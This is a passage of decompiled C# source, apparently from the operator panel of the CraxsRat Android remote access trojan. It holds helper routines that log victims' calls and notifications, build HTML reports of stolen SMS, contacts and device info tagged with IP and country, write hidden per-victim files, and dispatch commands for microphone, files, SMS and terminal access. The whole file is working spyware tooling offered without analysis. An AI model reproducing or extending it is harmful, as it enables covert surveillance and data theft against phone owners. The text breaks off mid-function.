using System;
using System.Collections.Generic;
using System.Data;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using WinMM;

// Token: 0x020000B2 RID: 178
[StandardModule]
internal sealed class reso
{
	// Token: 0x0600075F RID: 1887 RVA: 0x000B0298 File Offset: 0x000AE498
	public static Bitmap CheckAdmin(bool isadmin)
	{
		Bitmap result;
		if (isadmin)
		{
			result = Resources.shieldon;
		}
		else
		{
			result = Resources.shieldoff;
		}
		return result;
	}

	// Token: 0x06000760 RID: 1888 RVA: 0x000B02B8 File Offset: 0x000AE4B8
	public static string CraxsRatkfvuiorkenfudpajrsnCraxsRatsuhqws(string MSG, Client cli)
	{
		MSG = MSG.Replace("@", "");
		string[] array = MSG.Split(new char[]
		{
			'|'
		});
		string text = array[1];
		string text2 = array[2];
		string text3 = "null";
		string text4 = array[0];
		string a = text4;
		if (!(a == "mc"))
		{
			if (!(a == "oge"))
			{
				if (!(a == "ogs"))
				{
					if (!(a == "ene"))
					{
						if (!(a == "ens"))
						{
							if (a == "onn")
							{
								text3 = "• [ Received \ud83e\udc83 ]";
							}
						}
						else
						{
							text3 = "• [ Answered \ud83e\udc83 ]";
						}
					}
					else
					{
						text3 = "• [ Ended \ud83e\udc83 ]";
					}
				}
				else
				{
					text3 = "• [ Started \ud83e\udc81 ]";
				}
			}
			else
			{
				text3 = "• [ Ended \ud83e\udc81 ]";
			}
		}
		else
		{
			text3 = "• [ Missed Call ]";
		}
		Data.MainForm.LogCalls(new object[]
		{
			Codes.ResizeImage(cli.Wallpaper, new Size(45, 45), false),
			text3
		});
		if (text.ToLower().Contains("null"))
		{
			text = "Not Found";
		}
		return string.Concat(new string[]
		{
			text3,
			"\r\n┃\r\n┗━━➤Number: --> ",
			text,
			"\r\n┃\r\n┗━━━➤Date: -> ",
			text2
		});
	}

	// Token: 0x06000761 RID: 1889 RVA: 0x000B03F4 File Offset: 0x000AE5F4
	public static string ChekLink(string lnk)
	{
		string result;
		if (!lnk.StartsWith("https://") && !lnk.StartsWith("http://"))
		{
			result = "https://" + lnk;
		}
		else
		{
			result = lnk;
		}
		return result;
	}

	// Token: 0x06000762 RID: 1890 RVA: 0x000B0434 File Offset: 0x000AE634
	private static string GetFlag(string ips)
	{
		string result;
		if (ips.Contains("-"))
		{
			string ipc = ips.Split(new char[]
			{
				'-'
			})[1].Trim();
			Bitmap bitmap = (Bitmap)GetFlagThisIp.ThisIp(ipc);
			if (bitmap == null)
			{
				result = "";
			}
			else
			{
				ImageConverter imageConverter = new ImageConverter();
				byte[] inArray = (byte[])imageConverter.ConvertTo(bitmap, typeof(byte[]));
				bitmap.Dispose();
				result = "<img src=\"data:Image/ png;base64," + Convert.ToBase64String(inArray) + "\" alt=\"flag\" />";
			}
		}
		else
		{
			result = "";
		}
		return result;
	}

	// Token: 0x06000763 RID: 1891 RVA: 0x000B04D0 File Offset: 0x000AE6D0
	public static void Directory_Exist(Client clas)
	{
		if (clas != null)
		{
			string folderUSER = clas.FolderUSER;
			if (!Directory.Exists(folderUSER))
			{
				Directory.CreateDirectory(folderUSER);
			}
			reso.Sys(new string[]
			{
				folderUSER,
				clas.ClientName,
				clas.ClientAddressIP,
				clas.Country
			});
		}
	}

	// Token: 0x06000764 RID: 1892 RVA: 0x000B0528 File Offset: 0x000AE728
	internal static string CheckTypeScreenRead(string v)
	{
		string result;
		if (!(v == "5"))
		{
			if (!(v == "4"))
			{
				if (!(v == "3"))
				{
					if (!(v == "2"))
					{
						if (!(v == "1"))
						{
							if (!(v == "0"))
							{
								result = "";
							}
							else
							{
								result = "textbox:";
							}
						}
						else
						{
							result = "Button:";
						}
					}
					else
					{
						result = "Text:";
					}
				}
				else
				{
					result = "Pic:";
				}
			}
			else
			{
				result = "Pic:";
			}
		}
		else
		{
			result = "CheckBox:";
		}
		return result;
	}

	// Token: 0x06000765 RID: 1893 RVA: 0x000B05BC File Offset: 0x000AE7BC
	public static string GetVersionClient(string[] k)
	{
		string result;
		if (k.Length >= 9)
		{
			string left = k[8].Trim();
			if (Operators.CompareString(left, "[CR]", false) != 0)
			{
				result = k[8].Trim();
			}
			else
			{
				result = "k";
			}
		}
		else
		{
			result = "";
		}
		return result;
	}

	// Token: 0x06000766 RID: 1894 RVA: 0x000B060C File Offset: 0x000AE80C
	public static void Sys(string[] data)
	{
		try
		{
			string path = data[0] + "\\user.info";
			if (File.Exists(path))
			{
				File.SetAttributes(path, FileAttributes.Normal);
			}
			File.WriteAllText(path, string.Concat(new string[]
			{
				data[1],
				"\r\n",
				data[2],
				"\r\n",
				data[3]
			}));
			File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000767 RID: 1895 RVA: 0x000B068C File Offset: 0x000AE88C
	internal static string[] formatrecords(string thedata)
	{
		return thedata.Split(new char[]
		{
			'*'
		});
	}

	// Token: 0x06000768 RID: 1896 RVA: 0x000B06AC File Offset: 0x000AE8AC
	internal static object formatPasses(string tHEDATA)
	{
		string[] array = tHEDATA.Split(new char[]
		{
			'<'
		});
		return new object[]
		{
			array[0],
			array[1],
			array[2]
		};
	}

	// Token: 0x06000769 RID: 1897 RVA: 0x000B06E8 File Offset: 0x000AE8E8
	public static void SAVEit(Array ar)
	{
		string text = string.Format("{0}, {1}, {2}", SpySettings.DefaultColor_Foreground.R, SpySettings.DefaultColor_Foreground.G, SpySettings.DefaultColor_Foreground.B);
		string text2 = string.Format("{0}, {1}, {2}", SpySettings.DefaultColor_Background.R, SpySettings.DefaultColor_Background.G, SpySettings.DefaultColor_Background.B);
		string text3 = string.Format("{0}, {1}, {2}", SpySettings.DefaultColor_ColorTitles.R, SpySettings.DefaultColor_ColorTitles.G, SpySettings.DefaultColor_ColorTitles.B);
		string text4 = (string)ar.GetValue(6);
		string a = text4;
		checked
		{
			if (!(a == "info"))
			{
				if (!(a == "sms"))
				{
					if (!(a == "log"))
					{
						return;
					}
					string str = string.Concat(new string[]
					{
						"<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<style>\r\ntable, th, td {\r\n  border: 1px solid rgb(",
						text,
						");\r\n  border-collapse: collapse;\r\n  text-align: left;\r\n}\r\n<style>\r\n::-moz-selection {\r\n  color: rgb(",
						text2,
						");\r\n  background-color: rgb(",
						text,
						");\r\n}\r\n::selection {\r\n  color: rgb(",
						text2,
						");\r\n  background-color: rgb(",
						text,
						");\r\n}\r\n</style>\r\n</head>\r\n \r\n<body style=\"background: rgb(",
						text2,
						");font-family:courier;\" >\r\n<table style=\"width:50%\">"
					});
					string text5 = (string)ar.GetValue(3);
					string text6 = (string)ar.GetValue(4);
					string text7 = (string)ar.GetValue(5);
					string str2 = string.Concat(new string[]
					{
						"<h1 style=\"color: rgb(",
						text,
						");\">",
						text5,
						"</h1>\r\n<h2 style=\"color: rgb(",
						text,
						");\">",
						(Operators.CompareString(reso.GetFlag(text6), "", false) == 0) ? "" : (reso.GetFlag(text6) + Strings.Space(1)),
						text6.Replace("-", "/ip:"),
						"</h2>\r\n<p style=\"color: rgb(",
						text,
						");\">",
						text7,
						"</p>"
					});
					string path;
					if (Operators.ConditionalCompareObjectEqual(ar.GetValue(1), "null", false))
					{
						path = Conversions.ToString(ar.GetValue(2));
					}
					else
					{
						string text8 = (string)ar.GetValue(1) + "\\";
						string str3 = (string)ar.GetValue(2) + "\\";
						string str4 = (string)ar.GetValue(7);
						if (!Directory.Exists(text8))
						{
							return;
						}
						if (!Directory.Exists(text8 + str3))
						{
							Directory.CreateDirectory(text8 + str3);
						}
						path = text8 + str3 + str4;
						if (!File.Exists(path))
						{
							File.Create(path).Close();
						}
						if (!File.Exists(path))
						{
							return;
						}
					}
					using (StreamWriter streamWriter = new StreamWriter(path, true, Codes.Encoding()))
					{
						streamWriter.Write(str + "\r\n");
						streamWriter.Write(str2 + "\r\n");
						streamWriter.Write(string.Concat(new string[]
						{
							"<tr style=\"color: rgb(",
							text2,
							"); background: rgb(",
							text,
							");\">\r\n"
						}));
						DataGridView dataGridView = (DataGridView)ar.GetValue(0);
						int num = dataGridView.ColumnCount - 1;
						for (int i = 0; i <= num; i++)
						{
							if (dataGridView.Columns[i].GetType().ToString().ToLower().Contains("DataGridViewTextBoxColumn".ToLower()))
							{
								streamWriter.Write("<th>" + dataGridView.Columns[i].HeaderText + "</th>\r\n");
							}
						}
						int num2 = dataGridView.Rows.Count - 1;
						for (int j = 0; j <= num2; j++)
						{
							streamWriter.Write("</tr>\r\n");
							streamWriter.Write(string.Concat(new string[]
							{
								"<tr style=\"color: rgb(",
								text,
								"); background: rgb(",
								text2,
								");\">\r\n"
							}));
							int num3 = dataGridView.ColumnCount - 1;
							for (int k = 0; k <= num3; k++)
							{
								if (dataGridView.Columns[k].GetType().ToString().ToLower().Contains("DataGridViewTextBoxColumn".ToLower()))
								{
									streamWriter.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", dataGridView.Rows[j].Cells[k].Value), "</td>"), "\r\n"));
								}
							}
							streamWriter.Write("</tr>\r\n");
						}
						streamWriter.Write("</table>\r\n");
						streamWriter.Write("</body>\r\n");
						streamWriter.Write("</html>\r\n");
						streamWriter.Close();
						return;
					}
				}
				DataGridView dataGridView2 = (DataGridView)ar.GetValue(0);
				string str5 = string.Concat(new string[]
				{
					"<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<style>\r\ntable, th, td {\r\n  border: 1px solid rgb(",
					text,
					");\r\n  border-collapse: collapse;\r\n  text-align: left;\r\n}\r\n<style>\r\n::-moz-selection {\r\n  color: rgb(",
					text2,
					");\r\n  background-color: rgb(",
					text,
					");\r\n}\r\n::selection {\r\n  color: rgb(",
					text2,
					");\r\n  background-color: rgb(",
					text,
					");\r\n}\r\n</style>\r\n</head>\r\n \r\n<body style=\"background: rgb(",
					text2,
					");font-family:courier;\" >\r\n<table style=\"width:50%\">"
				});
				string text9 = (string)ar.GetValue(3);
				string text10 = (string)ar.GetValue(4);
				string str6 = string.Empty;
				if (dataGridView2.Rows.Count > 0)
				{
					str6 = Conversions.ToString(dataGridView2.Rows[0].Cells[4].Value);
				}
				string text11 = (string)ar.GetValue(5) + Strings.Space(1) + str6;
				string str7 = string.Concat(new string[]
				{
					"<h1 style=\"color: rgb(",
					text,
					");\">",
					text9,
					"</h1>\r\n<h2 style=\"color: rgb(",
					text,
					");\">",
					(Operators.CompareString(reso.GetFlag(text10), "", false) == 0) ? "" : (reso.GetFlag(text10) + Strings.Space(1)),
					text10.Replace("-", "/ip:"),
					"</h2>\r\n<p style=\"color: rgb(",
					text,
					");\">",
					text11,
					"</p>"
				});
				string path2;
				if (Operators.ConditionalCompareObjectEqual(ar.GetValue(1), "null", false))
				{
					path2 = Conversions.ToString(ar.GetValue(2));
				}
				else
				{
					string text12 = (string)ar.GetValue(1) + "\\";
					string str8 = (string)ar.GetValue(2) + "\\";
					string str9 = (string)ar.GetValue(7);
					if (!Directory.Exists(text12))
					{
						return;
					}
					if (!Directory.Exists(text12 + str8))
					{
						Directory.CreateDirectory(text12 + str8);
					}
					path2 = text12 + str8 + str9;
					if (!File.Exists(path2))
					{
						File.Create(path2).Close();
					}
					if (!File.Exists(path2))
					{
						return;
					}
				}
				using (StreamWriter streamWriter2 = new StreamWriter(path2, true, Codes.Encoding()))
				{
					streamWriter2.Write(str5 + "\r\n");
					streamWriter2.Write(str7 + "\r\n");
					streamWriter2.Write(string.Concat(new string[]
					{
						"<style>\r\ndiv {border: 2px solid gray;padding: 10px;color: rgb(",
						text,
						");\r\n border-color: rgb(",
						text,
						")\r\n}\r\n<p style=\"color: rgb(",
						text,
						");\">\r\n</style>\r\n"
					}));
					string headerText = dataGridView2.Columns[0].HeaderText;
					string headerText2 = dataGridView2.Columns[1].HeaderText;
					string headerText3 = dataGridView2.Columns[2].HeaderText;
					int num4 = dataGridView2.Rows.Count - 1;
					for (int l = 0; l <= num4; l++)
					{
						streamWriter2.Write("<div>\r\n");
						streamWriter2.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>" + headerText + ":", dataGridView2.Rows[l].Cells[0].Value), "</p>"), "\r\n"));
						streamWriter2.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>" + headerText2 + ":", dataGridView2.Rows[l].Cells[1].Value), "</p>"), "\r\n"));
						streamWriter2.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>" + headerText3 + ":", dataGridView2.Rows[l].Cells[2].Value), "</p>"), "\r\n"));
						streamWriter2.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>", dataGridView2.Rows[l].Tag), "</p>"), "\r\n"));
						streamWriter2.Write("</div>\r\n");
					}
					streamWriter2.Write("</body>\r\n");
					streamWriter2.Write("</html>\r\n");
					streamWriter2.Close();
					return;
				}
			}
			string str10 = string.Concat(new string[]
			{
				"<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<style>\r\ntable, th, td {\r\n  border: 1px solid rgb(",
				text,
				");\r\n  border-collapse: collapse;\r\n  text-align: left;\r\n}\r\n  tr.noBorder td {\r\n  border: 0;\r\n}\r\n<style>\r\n::-moz-selection {\r\n  color: rgb(",
				text2,
				");\r\n  background-color: rgb(",
				text,
				");\r\n}\r\n::selection {\r\n  color: rgb(",
				text2,
				");\r\n  background-color: rgb(",
				text,
				");\r\n}\r\n</style>\r\n</head>\r\n \r\n<body style=\"background: rgb(",
				text2,
				");font-family:courier;\" >\r\n<table style=\"width:50%\">"
			});
			string text13 = (string)ar.GetValue(3);
			string text14 = (string)ar.GetValue(4);
			string text15 = (string)ar.GetValue(5);
			string str11 = string.Concat(new string[]
			{
				"<h1 style=\"color: rgb(",
				text,
				");\">",
				text13,
				"</h1>\r\n<h2 style=\"color: rgb(",
				text,
				");\">",
				(Operators.CompareString(reso.GetFlag(text14), "", false) == 0) ? "" : (reso.GetFlag(text14) + Strings.Space(1)),
				text14.Replace("-", "/ip:"),
				"</h2>\r\n<p style=\"color: rgb(",
				text,
				");\">",
				text15,
				"</p>"
			});
			string path3;
			if (Operators.ConditionalCompareObjectEqual(ar.GetValue(1), "null", false))
			{
				path3 = Conversions.ToString(ar.GetValue(2));
			}
			else
			{
				string text16 = (string)ar.GetValue(1) + "\\";
				string str12 = (string)ar.GetValue(2) + "\\";
				string str13 = (string)ar.GetValue(7);
				if (!Directory.Exists(text16))
				{
					return;
				}
				if (!Directory.Exists(text16 + str12))
				{
					Directory.CreateDirectory(text16 + str12);
				}
				path3 = text16 + str12 + str13;
				if (!File.Exists(path3))
				{
					File.Create(path3).Close();
				}
				if (!File.Exists(path3))
				{
					return;
				}
			}
			using (StreamWriter streamWriter3 = new StreamWriter(path3, true, Codes.Encoding()))
			{
				streamWriter3.Write(str10 + "\r\n");
				streamWriter3.Write(str11 + "\r\n");
				streamWriter3.Write(string.Concat(new string[]
				{
					"<tr style=\"color: rgb(",
					text2,
					"); background: rgb(",
					text,
					");\">\r\n"
				}));
				DataSet dataSet = (DataSet)ar.GetValue(0);
				DataTable dataTable = dataSet.Tables[0];
				streamWriter3.Write("<th>" + dataTable.Columns[0].ColumnName + "</th>\r\n");
				streamWriter3.Write("<th>" + dataTable.Columns[1].ColumnName + "</th>\r\n");
				foreach (object obj in dataTable.Rows)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(obj);
					streamWriter3.Write("</tr>\r\n");
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(objectValue, null, "Item", new object[]
					{
						1
					}, null, null, null), "sub", false))
					{
						streamWriter3.Write(string.Concat(new string[]
						{
							"<tr Class=\"noBorder\"; style=\"color: rgb(",
							text3,
							"); background: rgb(",
							text2,
							");\">\r\n"
						}));
						streamWriter3.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", NewLateBinding.LateGet(objectValue, null, "Item", new object[]
						{
							0
						}, null, null, null)), "</td>"), "\r\n"));
						streamWriter3.Write("<td>" + string.Empty + "</td>\r\n");
						streamWriter3.Write("</tr>\r\n");
					}
					else
					{
						streamWriter3.Write(string.Concat(new string[]
						{
							"<tr style=\"color: rgb(",
							text,
							"); background: rgb(",
							text2,
							");\">\r\n"
						}));
						streamWriter3.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", NewLateBinding.LateGet(objectValue, null, "Item", new object[]
						{
							0
						}, null, null, null)), "</td>"), "\r\n"));
						streamWriter3.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", NewLateBinding.LateGet(objectValue, null, "Item", new object[]
						{
							1
						}, null, null, null)), "</td>"), "\r\n"));
						streamWriter3.Write("</tr>\r\n");
					}
				}
				streamWriter3.Write("</table>\r\n");
				streamWriter3.Write("</body>\r\n");
				streamWriter3.Write("</html>\r\n");
				streamWriter3.Close();
			}
		}
	}

	// Token: 0x0600076A RID: 1898 RVA: 0x000B1618 File Offset: 0x000AF818
	internal static void FormatNotifi(string tHEDATA, Client cli)
	{
		checked
		{
			try
			{
				string[] array = tHEDATA.Split(new char[]
				{
					'|'
				});
				string text = array[0];
				string text2 = array[1];
				string text3 = array[2] + array[3];
				int num = cli.Notifications.Count<string>() - 1;
				for (int i = 0; i <= num; i++)
				{
					if (cli.Notifications[i] == null)
					{
						cli.Notifications[i] = string.Concat(new string[]
						{
							"\r\n\r\n",
							text,
							"\r\n\r\n",
							text2,
							"\r\n\r\n",
							text3
						});
						IL_93:
						cli.isnewnotifi = true;
						Data.MainForm.LogNotifi(new object[]
						{
							Codes.ResizeImage(cli.Wallpaper, new Size(45, 45), false),
							text3
						});
						return;
					}
				}
				goto IL_93;
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600076B RID: 1899 RVA: 0x000034FB File Offset: 0x000016FB
	public static void UPDATEKEY(string key, Collection Col, object[] obj)
	{
		Col.Remove(key);
		Col.Add(obj, key, null, null);
	}

	// Token: 0x0600076C RID: 1900 RVA: 0x000B1700 File Offset: 0x000AF900
	public static object GETKEY(string key, Collection Col)
	{
		object result;
		try
		{
			result = Col[key];
		}
		catch (Exception)
		{
			result = null;
		}
		return result;
	}

	// Token: 0x0600076D RID: 1901 RVA: 0x000B1730 File Offset: 0x000AF930
	public static string BytesConverter(long bytes)
	{
		long num = 1024L;
		long num2 = 1048576L;
		long num3 = 1073741824L;
		long num4 = 1099511627776L;
		string text = "0 Bytes";
		if (bytes < 1024L)
		{
			text = Conversions.ToString(bytes) + " Bytes";
		}
		else if (bytes > num4)
		{
			text = ((double)bytes / (double)num / (double)num / (double)num / (double)num).ToString("0.00") + " TB";
		}
		else if (bytes > num3)
		{
			text = ((double)bytes / (double)num / (double)num / (double)num).ToString("0.00") + " GB";
		}
		else if (bytes > num2)
		{
			text = ((double)bytes / (double)num / (double)num).ToString("0.00") + " MB";
		}
		else if (bytes >= num)
		{
			text = ((double)bytes / (double)num).ToString("0.00") + " KB";
		}
		return text.ToString();
	}

	// Token: 0x0600076E RID: 1902 RVA: 0x000B1858 File Offset: 0x000AFA58
	public static string Between(string v0, string v1)
	{
		string result;
		try
		{
			result = Regex.Match(reso.maps.ToString(), string.Concat(new string[]
			{
				"(?<=",
				Regex.Escape(v0),
				").+?(?=",
				Regex.Escape(v1),
				")"
			}), RegexOptions.IgnoreCase).Value;
		}
		catch (Exception)
		{
			result = "-1";
		}
		return result;
	}

	// Token: 0x0600076F RID: 1903 RVA: 0x000B18D0 File Offset: 0x000AFAD0
	public static WaveFormat FormatWave(int v)
	{
		if (v <= 16000)
		{
			if (v == 8000)
			{
				return WaveFormat.Pcm8Khz16BitMono;
			}
			if (v == 11025)
			{
				return WaveFormat.Pcm11Khz16BitMono;
			}
			if (v == 16000)
			{
				return WaveFormat.Pcm16Khz16BitMono;
			}
		}
		else
		{
			if (v == 22050)
			{
				return WaveFormat.Pcm22Khz16BitMono;
			}
			if (v == 32000)
			{
				return WaveFormat.Pcm32Khz16BitMono;
			}
			if (v == 44100)
			{
				return WaveFormat.Pcm44Khz16BitMono;
			}
		}
		return WaveFormat.Pcm8Khz16BitMono;
	}

	// Token: 0x06000770 RID: 1904 RVA: 0x000B1950 File Offset: 0x000AFB50
	public static string HzString(int v)
	{
		if (v <= 16000)
		{
			if (v == 8000)
			{
				return "8000 (Hz)";
			}
			if (v == 11025)
			{
				return "11025 (Hz)";
			}
			if (v == 16000)
			{
				return "16000 (Hz)";
			}
		}
		else
		{
			if (v == 22050)
			{
				return "22050 (Hz)";
			}
			if (v == 32000)
			{
				return "32000 (Hz)";
			}
			if (v == 44100)
			{
				return "44100 (Hz)";
			}
		}
		return "null";
	}

	// Token: 0x06000771 RID: 1905 RVA: 0x000B19D0 File Offset: 0x000AFBD0
	public static int HzInt(string v)
	{
		int result;
		if (!(v == "44100 (Hz)"))
		{
			if (!(v == "32000 (Hz)"))
			{
				if (!(v == "22050 (Hz)"))
				{
					if (!(v == "16000 (Hz)"))
					{
						if (!(v == "11025 (Hz)"))
						{
							if (!(v == "8000 (Hz)"))
							{
								result = 8000;
							}
							else
							{
								result = 8000;
							}
						}
						else
						{
							result = 11025;
						}
					}
					else
					{
						result = 16000;
					}
				}
				else
				{
					result = 22050;
				}
			}
			else
			{
				result = 32000;
			}
		}
		else
		{
			result = 44100;
		}
		return result;
	}

	// Token: 0x06000772 RID: 1906 RVA: 0x000B1A64 File Offset: 0x000AFC64
	public static string Maps_style()
	{
		return SpySettings.STYLE_MAPS;
	}

	// Token: 0x06000773 RID: 1907 RVA: 0x000B1A78 File Offset: 0x000AFC78
	public static Bitmap GetBattery(string Clientbat)
	{
		int num = Conversions.ToInteger(Clientbat.Replace("f", ""));
		Bitmap result;
		if (num < 0)
		{
			result = Resources.chrg;
		}
		else if (num <= 25)
		{
			result = Resources.low;
		}
		else if (num <= 50)
		{
			result = Resources.min;
		}
		else if (num <= 80)
		{
			result = Resources.Abov_mid;
		}
		else
		{
			result = Resources.full;
		}
		return result;
	}

	// Token: 0x06000774 RID: 1908 RVA: 0x000B1AE8 File Offset: 0x000AFCE8
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static string Generals(string num)
	{
		if (num != null)
		{
			int length = num.Length;
			if (length == 5)
			{
				switch (num[4])
				{
				case '1':
					if (num == "gen-1")
					{
						return "apps";
					}
					break;
				case '2':
					if (num == "gen-2")
					{
						return "calls";
					}
					break;
				case '3':
					if (num == "gen-3")
					{
						return "contacts";
					}
					break;
				case '4':
					if (num == "gen-4")
					{
						return "files";
					}
					break;
				case '5':
					if (num == "gen-5")
					{
						return "info";
					}
					break;
				case '6':
					if (num == "gen-6")
					{
						return "microphone";
					}
					break;
				case '7':
					if (num == "gen-7")
					{
						return "sms";
					}
					break;
				case '8':
					if (num == "gen-8")
					{
						return "terminal";
					}
					break;
				}
			}
		}
		ProjectData.EndApp();
		return null;
	}

	// Token: 0x06000775 RID: 1909 RVA: 0x000B1C10 File Offset: 0x000AFE10
	public static void NewIcon(string icon, string path)
	{
		string str = "DefaultIcon";
		try
		{
			RegistryKey registryKey = Registry.ClassesRoot.OpenSubKey(path + "\\" + str, true);
			if (registryKey == null)
			{
				Registry.ClassesRoot.CreateSubKey(path + "\\" + str).SetValue("", icon);
				RefreshExplorer.EnvRefresh();
			}
			else if (!File.Exists(Conversions.ToString(registryKey.GetValue(""))))
			{
				registryKey.SetValue("", icon);
				RefreshExplorer.EnvRefresh();
			}
		}
		catch (UnauthorizedAccessException)
		{
		}
	}

	// Token: 0x06000776 RID: 1910 RVA: 0x000B1CAC File Offset: 0x000AFEAC
	public static Bitmap GetScreen(string v)
	{
		string a = v.Trim();
		Bitmap result;
		if (!(a == "3"))
		{
			if (!(a == "2"))
			{
				if (!(a == "1"))
				{
					if (!(a == "0"))
					{
						result = Resources.OFF;
					}
					else
					{
						result = Resources.ON_LOCK;
					}
				}
				else
				{
					result = Resources.OFF_LOCK;
				}
			}
			else
			{
				result = Resources._on;
			}
		}
		else
		{
			result = Resources.OFF;
		}
		return result;
	}

	// Token: 0x06000777 RID: 1911 RVA: 0x000B1D20 File Offset: 0x000AFF20
	private static Bitmap FormatImg(string s, Client Client)
	{
		MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(s));
		Bitmap srcImage = new Bitmap(Image.FromStream(memoryStream));
		memoryStream.Dispose();
		return new Bitmap(reso.CropToCircle(srcImage));
	}

	// Token: 0x06000778 RID: 1912 RVA: 0x000B1D58 File Offset: 0x000AFF58
	public static Image addflag(Image bmPhoto, Image imgPhoto)
	{
		checked
		{
			try
			{
				Bitmap bitmap = new Bitmap(bmPhoto);
				bitmap.SetResolution(imgPhoto.HorizontalResolution, imgPhoto.VerticalResolution);
				Graphics graphics = Graphics.FromImage(bitmap);
				ImageAttributes imageAttributes = new ImageAttributes();
				ColorMap[] map = new ColorMap[]
				{
					new ColorMap
					{
						OldColor = Color.FromArgb(255, 0, 255, 0),
						NewColor = Color.FromArgb(0, 0, 0, 0)
					}
				};
				imageAttributes.SetRemapTable(map, ColorAdjustType.Bitmap);
				int num = bmPhoto.Width - imgPhoto.Width - 10;
				graphics.DrawImage(imgPhoto, new Rectangle(num + 18, 25, imgPhoto.Width, imgPhoto.Height), 0, 0, imgPhoto.Width, imgPhoto.Height, GraphicsUnit.Pixel, imageAttributes);
				imgPhoto = bitmap;
				graphics.Dispose();
				return imgPhoto;
			}
			catch (Exception)
			{
			}
			return bmPhoto;
		}
	}

	// Token: 0x06000779 RID: 1913 RVA: 0x000B1E34 File Offset: 0x000B0034
	public static Image CropToCircle(Image srcImage)
	{
		Bitmap bitmap = new Bitmap(srcImage.Width, srcImage.Height);
		using (Graphics graphics = Graphics.FromImage(bitmap))
		{
			GraphicsPath graphicsPath = new GraphicsPath();
			graphics.SmoothingMode = SmoothingMode.AntiAlias;
			graphicsPath.AddEllipse(0, 0, bitmap.Width, bitmap.Height);
			System.Drawing.Region region = graphics.Clip = new System.Drawing.Region(graphicsPath);
			graphics.DrawImage(srcImage, Point.Empty);
			region.Dispose();
			graphicsPath.Dispose();
		}
		srcImage.Dispose();
		srcImage.Dispose();
		return bitmap;
	}

	// Token: 0x0600077A RID: 1914 RVA: 0x000B1ED4 File Offset: 0x000B00D4
	public static Bitmap Wallpaper(string v, int xx, int yy, Client Client)
	{
		string s = Resources.wallpaper.ToString().Trim();
		if (Operators.CompareString(v, "-1", false) != 0 | Operators.CompareString(v, "", false) == 0)
		{
			byte[] buffer = Convert.FromBase64String(v);
			MemoryStream memoryStream = new MemoryStream(buffer);
			Bitmap bitmap = new Bitmap(Image.FromStream(memoryStream));
			int width = bitmap.Size.Width;
			int height = bitmap.Size.Height;
			if (width == xx && height == yy)
			{
				s = v;
			}
			bitmap.Dispose();
			memoryStream.Dispose();
		}
		return reso.FormatImg(s, Client);
	}

	// Token: 0x0600077B RID: 1915 RVA: 0x000B1F80 File Offset: 0x000B0180
	public static Image GetEllImage(int sel, object[] parm)
	{
		checked
		{
			if (sel != 0)
			{
				if (sel != 1)
				{
					return null;
				}
				Color color = Color.FromArgb(170, (int)SpySettings.DefaultColor_Background.R, (int)SpySettings.DefaultColor_Background.G, (int)SpySettings.DefaultColor_Background.B);
				Pen pen = new Pen(color, 2f);
				using (Bitmap bitmap = new Bitmap(48, 48))
				{
					using (Graphics graphics = Graphics.FromImage(bitmap))
					{
						graphics.SmoothingMode = SmoothingMode.AntiAlias;
						using (TextureBrush textureBrush = new TextureBrush(bitmap))
						{
							textureBrush.TranslateTransform(0f, 0f);
							using (new GraphicsPath())
							{
								using (SolidBrush solidBrush = new SolidBrush(reso.getClr()))
								{
									graphics.FillEllipse(solidBrush, 4, 4, bitmap.Width - 12, bitmap.Height - 12);
								}
								graphics.DrawEllipse(pen, 4, 4, bitmap.Width - 12, bitmap.Height - 12);
							}
						}
						string text = parm[0].ToString();
						if (Conversions.ToBoolean(Operators.AndObject(Operators.CompareString(text, "null", false) == 0, Operators.NotObject(Operators.CompareObjectEqual(parm[2], null, false)))))
						{
							text = parm[1].ToString();
						}
						string s = Strings.Space(1);
						if (text.Trim().Length > 0)
						{
							s = Conversions.ToString(text[0]);
						}
						Rectangle r = new Rectangle(6, 6, bitmap.Width - 15, bitmap.Height - 15);
						StringFormat stringFormat = new StringFormat();
						stringFormat.LineAlignment = StringAlignment.Center;
						stringFormat.Alignment = StringAlignment.Center;
						graphics.DrawString(s, reso.FontDrawString, new SolidBrush(color), r, stringFormat);
					}
					return new Bitmap(bitmap);
				}
			}
			Color color2 = Color.FromArgb(170, (int)SpySettings.DefaultColor_Background.R, (int)SpySettings.DefaultColor_Background.G, (int)SpySettings.DefaultColor_Background.B);
			Pen pen2 = new Pen(color2, 2f);
			Image result;
			using (Bitmap bitmap2 = new Bitmap(48, 48))
			{
				using (Graphics graphics2 = Graphics.FromImage(bitmap2))
				{
					graphics2.SmoothingMode = SmoothingMode.AntiAlias;
					using (TextureBrush textureBrush2 = new TextureBrush(bitmap2))
					{
						textureBrush2.TranslateTransform(0f, 0f);
						using (new GraphicsPath())
						{
							using (SolidBrush solidBrush2 = new SolidBrush(reso.getClr()))
							{
								graphics2.FillEllipse(solidBrush2, 4, 4, bitmap2.Width - 12, bitmap2.Height - 12);
							}
							graphics2.DrawEllipse(pen2, 4, 4, bitmap2.Width - 12, bitmap2.Height - 12);
						}
					}
					Image image = new Bitmap(parm[0].ToString());
